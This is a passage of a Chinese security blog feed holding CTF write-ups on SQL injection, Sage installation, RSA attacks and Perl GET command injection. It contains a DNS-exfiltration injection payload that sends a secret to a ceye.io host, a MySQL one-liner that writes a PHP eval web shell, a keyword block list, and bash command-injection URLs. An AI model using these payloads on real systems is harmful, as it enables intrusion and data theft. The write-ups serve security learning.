class="line">$conn=@mysql_connect(&quot;localhost&quot;,&apos;root&apos;,&apos;root&apos;) or die(&quot;数据库连接失败！&quot;);;</div><div class="line"></div><div class="line">#echo &quot;Connected to MySQL&lt;br /&gt;&quot;;</div><div class="line">echo &quot;Connected to MYSQL&lt;br /&gt;&quot;;</div><div class="line"></div><div class="line">mysql_select_db(&quot;sql4&quot;,$conn) or die(&quot;您要选择的数据库不存在&quot;);</div><div class="line">if(isset($_GET[&apos;id&apos;]))&#123;</div><div class="line">$id = $_GET[&apos;id&apos;];</div><div class="line">if(preg_match(&apos;/EXEC|xp_cmdshell|sp_configure|xp_reg(.*)|CREATE|DROP|declare</div><div class="line">|if|insert|into|outfile|dumpfile|sleep|wait|benchmark/i&apos;, $id)) &#123;</div><div class="line">die(&apos;stupid hacker&apos;);</div><div class="line">&#125;</div><div class="line">$query = &quot;select username from not_here where id = $id&quot;; </div><div class="line">$stmt = mysql_query( $query );</div><div class="line">$arr=@mysql_fetch_array($query);</div><div class="line"></div><div class="line">if (is_array($arr))&#123;</div><div class="line">//TO DO: ...</div><div class="line">//It&apos;s time to sleep...</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">else print(&quot;?id&quot;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><p><strong>payload</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=8 union select load_file(concat(&quot;\\\\&quot;,(select password from secret),&quot;.3g3dxq.ceye.io\\abc&quot;))</div></pre></td></tr></table></figure></p><p><strong>结果</strong><br><img src="https://i.imgur.com/Tro5zcn.jpg" alt=""></p><p><strong>PS:</strong><br>在搜索这些函数的时候，学会一个新姿势,算是意外之喜吧。用mysql写一句话:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select &apos;&lt;?php eval($_POST[cmd])?&gt;&apos; into outfile &apos;D:/PHPnow-1.5.4/htdocs/index2.php&apos;</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;源于HCTF2017的一道题目，看来自己还是太年轻了，这种注入自己以前一直没见过，然后一搜一大把。&lt;/p&gt;
    
    </summary>
    
    
      <category term="注入" scheme="http://Err0rzz.github.io/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>sage安装</title>
    <link href="http://Err0rzz.github.io/2017/11/16/sage%E5%AE%89%E8%A3%85/"/>
    <id>http://Err0rzz.github.io/2017/11/16/sage安装/</id>
    <published>2017-11-16T05:42:41.000Z</published>
    <updated>2017-11-16T05:59:13.078Z</updated>
    
    <content type="html"><![CDATA[<p>Sage可以干什么？介绍中有这么一句：“这款开源软件的支持者称Sage能够完成从12维物体到计算全球变暖效应数学模型中的降雨量的任何事情。”Sage包含了从线性代数、微积分，到密码学、数值计算、组合数学、群论、图论、数论等各种初高等数学的计算功能。</p><a id="more"></a><p>Sage的一大特点是整合了众多优秀的开源数学软件，使用户可以在Sage中方便的使用这些库中的相应功能。Sage目前整合了近一百个开源的数学库，这其中包括著名的ATLAS、BLAS、LAPACK、Boost、GSL、SciPy等等，完整列表可以查看这里。</p><p>Sage基于并使用Python，Python程序可以在Sage中直接运行，也可以在Sage中使用Python的各种库，感觉就像是提供了一个包含各种数学功能的Python环境。</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>这里介绍linux下的安装。<br>官网下载地址：<a href="http://www.sagemath.org/" target="_blank" rel="external">http://www.sagemath.org/</a><br>根据自己的环境找到安装包，我这里安装的是<a href="http://mirror.hust.edu.cn/sagemath/linux/64bit/index.html" target="_blank" rel="external">http://mirror.hust.edu.cn/sagemath/linux/64bit/index.html</a>下的64位的包。</p><p>下载好之后用以下命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">tar xvf sage-8.0-Ubuntu_16.04-x86_64.tar.bz2</div><div class="line">cd SageMath</div></pre></td></tr></table></figure></p><p>然后就能使用sage工具了，使用命令如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$ ./sage</div><div class="line"></div><div class="line">Rewriting paths for your new installation directory</div><div class="line">===================================================</div><div class="line"></div><div class="line">This might take a few minutes but only has to be done once.</div><div class="line"></div><div class="line">patching /home/user/tmp/SageMath/src/build/cythonized/sage/structure/list_clone.c</div><div class="line">(snip)</div><div class="line">patching /home/user/tmp/SageMath/src/build/cython_debug/cython_debug_info_sage.gsl.ode</div><div class="line">┌────────────────────────────────────────────────────────────────────┐</div><div class="line">│ SageMath Version 6.10, Release Date: 2015-12-18                    │</div><div class="line">│ Type &quot;notebook()&quot; for the browser-based notebook interface.        │</div><div class="line">│ Type &quot;help()&quot; for help.                                            │</div><div class="line">└────────────────────────────────────────────────────────────────────┘</div><div class="line">sage:</div></pre></td></tr></table></figure></p><p>这样是用交互式来使用sage。</p><p>如果是想使用<code>.sage</code>代码的话，直接执行以下命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./sage ***.sage</div></pre></td></tr></table></figure></p><p>即可运行sage文件</p><h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p>这里介绍<strong>Coppersmith partial information attack</strong>这种算法的sage代码的payload，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">p4 = 0xf3a5f928e11c5901f9f4289e513f046748efb99d4f8e706e207a943e1d2c9df43feab38e20c2106d87167e5501ac41adfc4912732457103a4359e5b433da78f39ad6f206b8f170192aa0841feb501ce1</div><div class="line">n = 0x7e7007c7c85788b9b77cda64c9b3f5d2a795fe1b1f8d3f120288a30a168c3ea932c7574700ff0f596c5ad04a703756aedc66b9b9e44911d55f0a72a1cc1a569cee02a84499cdb091b8471a8e6cc0ebca583dfd6fb8d5fecf32ff67d2ddeaaaaf9c71a10009b4218fc57743675f283d22734ac7ade2ca240772d11b5783755378f7c30988f41d4a9d62561ea6e5f2f21d3d44e8689e781d3f61356123929457d17b07a1d04741bf970afb590cd820dd12cf88f68b0e896388f433fd2adf3354353c9c56abb0cfea223387e6d0b2df10e450c621ac153e47369f888fdc0b39c842a5ddc6a11339862ccdb4be97a81445205fb8f8bde9daaad5d0dc2ea5bd3b8c43</div><div class="line"></div><div class="line">pbits = 1024</div><div class="line">kbits = pbits - p4.nbits()</div><div class="line">print p4.nbits()</div><div class="line">p4 = p4 &lt;&lt; kbits</div><div class="line"></div><div class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</div><div class="line">f = x + p4</div><div class="line">x0 = f.small_roots(X=2^kbits, beta=0.4)[0]</div><div class="line">print &quot;x: %s&quot; %hex(int(x0))</div><div class="line"></div><div class="line">p = p4+x0</div><div class="line">print &quot;p: &quot;, hex(int(p))</div><div class="line">assert n % p == 0</div><div class="line">q = n/int(p)</div><div class="line"></div><div class="line">print &quot;q: &quot;, hex(int(q))</div></pre></td></tr></table></figure></p><p>就是已知rsa算法中的p的高位p4，然后可以分解出p，q<br>运行结果如下：<br><img src="https://i.imgur.com/XdQ4uOv.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Sage可以干什么？介绍中有这么一句：“这款开源软件的支持者称Sage能够完成从12维物体到计算全球变暖效应数学模型中的降雨量的任何事情。”Sage包含了从线性代数、微积分，到密码学、数值计算、组合数学、群论、图论、数论等各种初高等数学的计算功能。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CTF中RSA套路</title>
    <link href="http://Err0rzz.github.io/2017/11/14/CTF%E4%B8%ADRSA%E5%A5%97%E8%B7%AF/"/>
    <id>http://Err0rzz.github.io/2017/11/14/CTF中RSA套路/</id>
    <published>2017-11-14T11:16:46.000Z</published>
    <updated>2017-12-08T08:57:28.067Z</updated>
    
    <content type="html"><![CDATA[<p>以前一直用的是<a href="http://bobao.360.cn/learning/detail/3058.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3058.html</a>这里的，可是发现这里面好久没更新了，想了想还是自己在整理一下吧。</p><a id="more"></a><p>具体RSA加解密算法就不介绍了，先看数据提取吧。</p><p><strong>需要注意的是，代码中很多地方用到了gmpy2库，安装方法参考<a href="https://www.cnblogs.com/pcat/p/5746821.html" title="pcat" target="_blank" rel="external">https://www.cnblogs.com/pcat/p/5746821.html</a></strong><br><br></p><h2 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h2><p>一般来说，RSA基本围绕着c,m,e,d,p,q,n这几个参数展开，但是题目一般不会直接给参数，需要我们自己手工提取。</p><ul><li><p>pem文件：针对这类文件可以直接使用openssl提取，大概使用过的方式有：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">openssl   rsautl -encrypt -in FLAG -inkey public.pem -pubin -out flag.enc</div><div class="line">openssl   rsa -pubin -text -modulus -in warmup -in public.pem</div></pre></td></tr></table></figure></li><li><p>pcap文件：针对这类文件可以使用wireshake follow一下。这种问题一般都是写了一个交互式crypto系统，可能产生多轮交互</p></li><li>ppc模式：这种模式是上述pcap文件的交互版，会给一个端口进行一些crypto的交互，参数会在交互中给出。</li></ul><h2 id="模数分解"><a href="#模数分解" class="headerlink" title="模数分解"></a>模数分解</h2><h1 id="已知e-p-q求d"><a href="#已知e-p-q求d" class="headerlink" title="已知e,p,q求d"></a>已知e,p,q求d</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">d = gmpy2.invert(e, (p-1)*(q-1))</div></pre></td></tr></table></figure><p><br></p><h1 id="已知e-d-n求p-q"><a href="#已知e-d-n求p-q" class="headerlink" title="已知e,d,n求p,q"></a>已知e,d,n求p,q</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">import random  </div><div class="line">  </div><div class="line">def gcd(a, b):  </div><div class="line">   if a &lt; b:  </div><div class="line">     a, b = b, a  </div><div class="line">   while b != 0:  </div><div class="line">     temp = a % b  </div><div class="line">     a = b  </div><div class="line">     b = temp  </div><div class="line">   return a  </div><div class="line">  </div><div class="line">def getpq(n,e,d):  </div><div class="line">    p = 1  </div><div class="line">    q = 1  </div><div class="line">    while p==1 and q==1:  </div><div class="line">        k = d * e - 1  </div><div class="line">        g = random.randint ( 0 , n )  </div><div class="line">        while p==1 and q==1 and k % 2 == 0:  </div><div class="line">            k /= 2  </div><div class="line">            y = pow(g,k,n)  </div><div class="line">            if y!=1 and gcd(y-1,n)&gt;1:  </div><div class="line">                p = gcd(y-1,n)  </div><div class="line">                q = n/p  </div><div class="line">    return p,q  </div><div class="line">  </div><div class="line">def main():  </div><div class="line"> </div><div class="line">    n = 0xa66791dc6988168de7ab77419bb7fb0c001c62710270075142942e19a8d8c51d053b3e3782a1de5dc5af4ebe99468170114a1dfe67cdc9a9af55d655620bbab  </div><div class="line">    e =  0x10001</div><div class="line">    d =  0x123c5b61ba36edb1d3679904199a89ea80c09b9122e1400c09adcf7784676d01d23356a7d44d6bd8bd50e94bfc723fa87d8862b75177691c11d757692df8881</div><div class="line"></div><div class="line">    p,q = getpq(n,e,d)  </div><div class="line">    print &quot;p: &quot;+hex(p)</div><div class="line">    print &quot;q: &quot;+hex(q)  </div><div class="line">  </div><div class="line">if __name__ == &apos;__main__&apos;:  </div><div class="line">    main()</div></pre></td></tr></table></figure><p><br></p><h1 id="在线分解n"><a href="#在线分解n" class="headerlink" title="在线分解n"></a>在线分解n</h1><p><a href="http://factordb.com" target="_blank" rel="external">http://factordb.com</a><br>通过在此类网站上查询n，如果可以分解或者之前分解成功过，那么可以直接得到p和q</p><h1 id="yafu分解n"><a href="#yafu分解n" class="headerlink" title="yafu分解n"></a>yafu分解n</h1><p><img src="https://i.imgur.com/dVDqGFL.png" alt=""><br>直接打开程序，然后输入factor($n)，<code>$n</code>为模数，此方法比上面的在线要好用很多<br><br></p><h1 id="公约数分解n"><a href="#公约数分解n" class="headerlink" title="公约数分解n"></a>公约数分解n</h1><p>识别此类题目，通常会发现题目给了多个n，均不相同，并且都是2048bit，4096bit级别，无法正面硬杠，并且明文都没什么联系，e也一般取65537。可以直接<code>gcd(n1,n2)</code>求出一个因数。如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">n1=9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327</div><div class="line">n2=13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743</div></pre></td></tr></table></figure></p><p>可以直接用公约数分解n，求得p,q<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">def gcd(a, b):</div><div class="line">   if a &lt; b:</div><div class="line">     a, b = b, a</div><div class="line">   while b != 0:</div><div class="line">     temp = a % b</div><div class="line">     a = b</div><div class="line">     b = temp</div><div class="line">   return a</div><div class="line"></div><div class="line">n1=9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327</div><div class="line">n2=13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743</div><div class="line">print &quot;p: &quot;+str(gcd(n1,n2))</div><div class="line">print &quot;q1: &quot;+str(n1/gcd(n1,n2))</div><div class="line">print &quot;q2: &quot;+str(n2/gcd(n1,n2))</div></pre></td></tr></table></figure></p><p><br></p><h2 id="低加密指数攻击"><a href="#低加密指数攻击" class="headerlink" title="低加密指数攻击"></a>低加密指数攻击</h2><h1 id="e-3时的小明文攻击"><a href="#e-3时的小明文攻击" class="headerlink" title="e=3时的小明文攻击"></a>e=3时的小明文攻击</h1><p>当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。如果明文的三次方虽然比n大，但是大不了多少，则可以爆破。如下代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">i=0</div><div class="line">   while 1:</div><div class="line">   if(gmpy2.root(c+i*N, 3)[1]==1):</div><div class="line">     print gmpy2.root(c+i*N, 3)</div><div class="line">     break</div><div class="line">   i=i+1</div></pre></td></tr></table></figure></p><p><br></p><h1 id="低加密指数广播攻击"><a href="#低加密指数广播攻击" class="headerlink" title="低加密指数广播攻击"></a>低加密指数广播攻击</h1><p>如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。<br>这个识别起来比较简单，一般来说都是给了三组加密的参数和明密文，其中题目很明确地能告诉你这三组的明文都是一样的，并且e都取了一个较小的数字。<br><img src="https://i.imgur.com/H7Zec1s.png" alt=""><br><br></p><h2 id="低解密指数攻击"><a href="#低解密指数攻击" class="headerlink" title="低解密指数攻击"></a>低解密指数攻击</h2><p>识别：e看起来特别大就行了<br>github上有开源的攻击代码<a href="https://github.com/pablocelayes/rsa-wiener-attack" title="rsa-wiener-attack" target="_blank" rel="external">https://github.com/pablocelayes/rsa-wiener-attack</a><br>这里注意一个细节问题，如果在运行脚本的时候报错，请在脚本前加上：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">import   sys</div><div class="line">sys.setrecursionlimit(10000000)</div></pre></td></tr></table></figure></p><p><br></p><h2 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h2><p>识别：若干次加密，e不同，n相同，m相同。就可以在不分解n和求d的前提下，解出明文m。<img src="https://i.imgur.com/w8UoOQ2.png" alt=""><br>已知e1,e2,n,c1,c2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">def egcd(a, b):</div><div class="line">    if a == 0:</div><div class="line">      return (b, 0, 1)</div><div class="line">    else:</div><div class="line">      g, y, x = egcd(b % a, a)</div><div class="line">      return (g, x - (b // a) * y, y)</div><div class="line">def modinv(a, m):</div><div class="line">    g, x, y = egcd(a, m)</div><div class="line">    if g != 1:</div><div class="line">      raise Exception(&apos;modular inverse does not exist&apos;)</div><div class="line">    else:</div><div class="line">      return x % m</div><div class="line"></div><div class="line">s = egcd(e1, e2)</div><div class="line">s1 = s[1]</div><div class="line">s2 = s[2]</div><div class="line"></div><div class="line">if s1&lt;0:</div><div class="line">   s1 = - s1</div><div class="line">   c1 = modinv(c1, n)</div><div class="line">elif s2&lt;0:</div><div class="line">   s2 = - s2</div><div class="line">   c2 = modinv(c2, n)</div><div class="line">m=(pow(c1,s1,n)*pow(c2,s2,n)) % n</div><div class="line">print &apos;&#123;:x&#125;&apos;.format(m).decode(&apos;hex&apos;)</div></pre></td></tr></table></figure></p><p><br></p><h2 id="已知dp-dq求解"><a href="#已知dp-dq求解" class="headerlink" title="已知dp,dq求解"></a>已知dp,dq求解</h2><p>其实这种方法很简单，但是由于我当时做的时候查了好久dp,dq是什么，所以还是记录下来扫个坑吧。<br>这种参数是为了让解密的时候更快速产生的，其中:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">dp=d%(p-1)</div><div class="line">dq=d%(q-1)</div></pre></td></tr></table></figure></p><p>解密全部代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">InvQ=gmpy2.invert(q,p)</div><div class="line">mp=pow(c,dp,p)</div><div class="line">mq=pow(c,dq,q)</div><div class="line">m=(((mp-mq)*InvQ)%p)*q+mq</div><div class="line">print &apos;&#123;:x&#125;&apos;.format(m).decode(&apos;hex&apos;)</div></pre></td></tr></table></figure></p><p><br></p><h2 id="隐藏小私有指数δ的RSA后门密钥生成算法"><a href="#隐藏小私有指数δ的RSA后门密钥生成算法" class="headerlink" title="隐藏小私有指数δ的RSA后门密钥生成算法"></a>隐藏小私有指数δ的RSA后门密钥生成算法</h2><p>以下题目来自于hctf2016<br><a href="http://0x48.pw/2016/11/28/0x28/" title="出题人的wp" target="_blank" rel="external">http://0x48.pw/2016/11/28/0x28/</a><br><a href="https://github.com/Hcamael/ctf-library/tree/master/RSA1" title="题目" target="_blank" rel="external">https://github.com/Hcamael/ctf-library/tree/master/RSA1</a><br><a href="https://github.com/Hcamael/ctf-library/blob/master/RSA1/rsa1_payload.py" title="payload" target="_blank" rel="external">https://github.com/Hcamael/ctf-library/blob/master/RSA1/rsa1_payload.py</a><br>算法原理如下：<br><img src="https://i.imgur.com/5thK6MI.png" alt=""><br>攻击方法也很简单<br><img src="https://i.imgur.com/5UCVMXO.png" alt=""></p><p>解题关键是在下图<br><img src="https://i.imgur.com/Om8Q7iX.png" alt=""><br><img src="https://i.imgur.com/faCg1Q1.png" alt=""><br>根据<strong>rsa-wiener-attack</strong>我们可以知道，在rsa算法中，如果密钥d特别小，则我们可以根据e,n直接求出d，所以上图满足条件。</p><p>而当我们求出了那两个东西(原谅我打不出来…),则和<strong>已知e,d,n求p,q</strong>的情况一样了，当p,q已知的时候就可以解出d了</p><h2 id="基于隐藏素数因子的RSA-HPβ算法-高比特位已知分解"><a href="#基于隐藏素数因子的RSA-HPβ算法-高比特位已知分解" class="headerlink" title="基于隐藏素数因子的RSA-HPβ算法(高比特位已知分解)"></a>基于隐藏素数因子的RSA-HPβ算法(高比特位已知分解)</h2><p>以下题目来自于hctf2016<br><a href="https://github.com/Hcamael/ctf-library/tree/master/RSA2" title="题目" target="_blank" rel="external">https://github.com/Hcamael/ctf-library/tree/master/RSA2</a><br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">https://github.com/Hcamael/ctf-library/blob/master/RSA2/rsa2_payload.py</div><div class="line">https://github.com/Hcamael/ctf-library/blob/master/RSA2/rsa2_payload.sage</div></pre></td></tr></table></figure></p><p>该后门算法依赖于<strong>Coppersmith partial information attack</strong>算法, sage实现该算法，sage安装详细看我的另一篇关于sage的安装。</p><p>Coppersmith partial information attack算法可以理解成，当我们已知素数p或者q的前一定位数，可以根据这个算法还原完整的p，q。<br>算法实现代码：<a href="https://github.com/Gao-Chuan/RSA-and-LLL-attacks" target="_blank" rel="external">https://github.com/Gao-Chuan/RSA-and-LLL-attacks</a></p><p>例题如下：<br><img src="https://i.imgur.com/P7UXiV6.png" alt=""></p><p>仔细观察算法，n是靠t,u,r来拼接成，而u是根据p的前5k/16位进行des转置得到的，所以<strong>当我们已知n的前提下，相当于我们已知p的前5k/16位</strong>。这就是我们利用的点。如下图：<br><img src="https://i.imgur.com/jtz02KN.png" alt=""></p><p>利用代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">p4 = 0xf3a5f928e11c5901f9f4289e513f046748efb99d4f8e706e207a943e1d2c9df43feab38e20c2106d87167e5501ac41adfc4912732457103a4359e5b433da78f39ad6f206b8f170192aa0841feb501ce1</div><div class="line">n = 0x7e7007c7c85788b9b77cda64c9b3f5d2a795fe1b1f8d3f120288a30a168c3ea932c7574700ff0f596c5ad04a703756aedc66b9b9e44911d55f0a72a1cc1a569cee02a84499cdb091b8471a8e6cc0ebca583dfd6fb8d5fecf32ff67d2ddeaaaaf9c71a10009b4218fc57743675f283d22734ac7ade2ca240772d11b5783755378f7c30988f41d4a9d62561ea6e5f2f21d3d44e8689e781d3f61356123929457d17b07a1d04741bf970afb590cd820dd12cf88f68b0e896388f433fd2adf3354353c9c56abb0cfea223387e6d0b2df10e450c621ac153e47369f888fdc0b39c842a5ddc6a11339862ccdb4be97a81445205fb8f8bde9daaad5d0dc2ea5bd3b8c43</div><div class="line"></div><div class="line">pbits = 1024</div><div class="line">kbits = pbits - p4.nbits()</div><div class="line">print p4.nbits()</div><div class="line">p4 = p4 &lt;&lt; kbits</div><div class="line"></div><div class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</div><div class="line">f = x + p4</div><div class="line">x0 = f.small_roots(X=2^kbits, beta=0.4)[0]</div><div class="line">print &quot;x: %s&quot; %hex(int(x0))</div><div class="line"></div><div class="line">p = p4+x0</div><div class="line">print &quot;p: &quot;, hex(int(p))</div><div class="line">assert n % p == 0</div><div class="line">q = n/int(p)</div><div class="line"></div><div class="line">print &quot;q: &quot;, hex(int(q))</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/Vwccm9g.png" alt=""><br><br></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;以前一直用的是&lt;a href=&quot;http://bobao.360.cn/learning/detail/3058.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://bobao.360.cn/learning/detail/3058.html&lt;/a&gt;这里的，可是发现这里面好久没更新了，想了想还是自己在整理一下吧。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>GET的命令执行漏洞</title>
    <link href="http://Err0rzz.github.io/2017/11/14/GET%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://Err0rzz.github.io/2017/11/14/GET的命令执行漏洞/</id>
    <published>2017-11-14T08:38:55.000Z</published>
    <updated>2017-11-14T11:00:39.404Z</updated>
    
    <content type="html"><![CDATA[<p>源于hitcon中的题目ssrfme的wp,然后去搜了下这个漏洞,做个简单的记录吧。<a href="https://lorexxar.cn/2017/11/10/hitcon2017-writeup/#sql-so-hard" title="LoRexxar&#39;s blog" target="_blank" rel="external">https://lorexxar.cn/2017/11/10/hitcon2017-writeup/#sql-so-hard</a></p><a id="more"></a><p>首先要先知道perl的open可以执行命令，如下：<br><img src="https://i.imgur.com/lUKOjRt.png" alt=""></p><p>而在GET命令中存在open函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">file.pm</div><div class="line">84: opendir(D, $path) or</div><div class="line">132:    open(F, $path) or return new</div></pre></td></tr></table></figure></p><p>同时open函数还支持file协议<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">root@iZ285ei82c1Z:~/test# cat /usr/share/perl5/LWP.pm</div><div class="line">...</div><div class="line">=head2 File Request</div><div class="line">The library supports GET and HEAD methods for file requests.  The</div><div class="line">&quot;If-Modified-Since&quot; header is supported.  All other headers are</div><div class="line">ignored.  The I&lt;host&gt; component of the file URL must be empty or set</div><div class="line">to &quot;localhost&quot;.  Any other I&lt;host&gt; value will be treated as an error.</div><div class="line">Directories are always converted to an HTML document.  For normal</div><div class="line">files, the &quot;Content-Type&quot; and &quot;Content-Encoding&quot; in the response are</div><div class="line">guessed based on the file suffix.</div><div class="line">Example:</div><div class="line">  $req = HTTP::Request-&gt;new(GET =&gt; &apos;file:/etc/passwd&apos;);</div><div class="line">...</div></pre></td></tr></table></figure></p><p>但是很尴尬的是，接下来的复现失败了，只能copy@LoRexxar师傅的了。<br>我们可以测试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@iZ285ei82c1Z:~/test# GET &apos;file:id|&apos;</div><div class="line">uid=0(root) gid=0(root) groups=0(root)</div></pre></td></tr></table></figure></p><p>发现成功执行了命令，payload来自rr的博客<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://13.115.136.15/?url=file:bash%20-c%20/readflag|&amp;filename=bash%20-c%20/readflag|</div><div class="line">http://13.115.136.15/?url=file:bash%20-c%20/readflag|&amp;filename=bash%20-c%20/readflag|</div><div 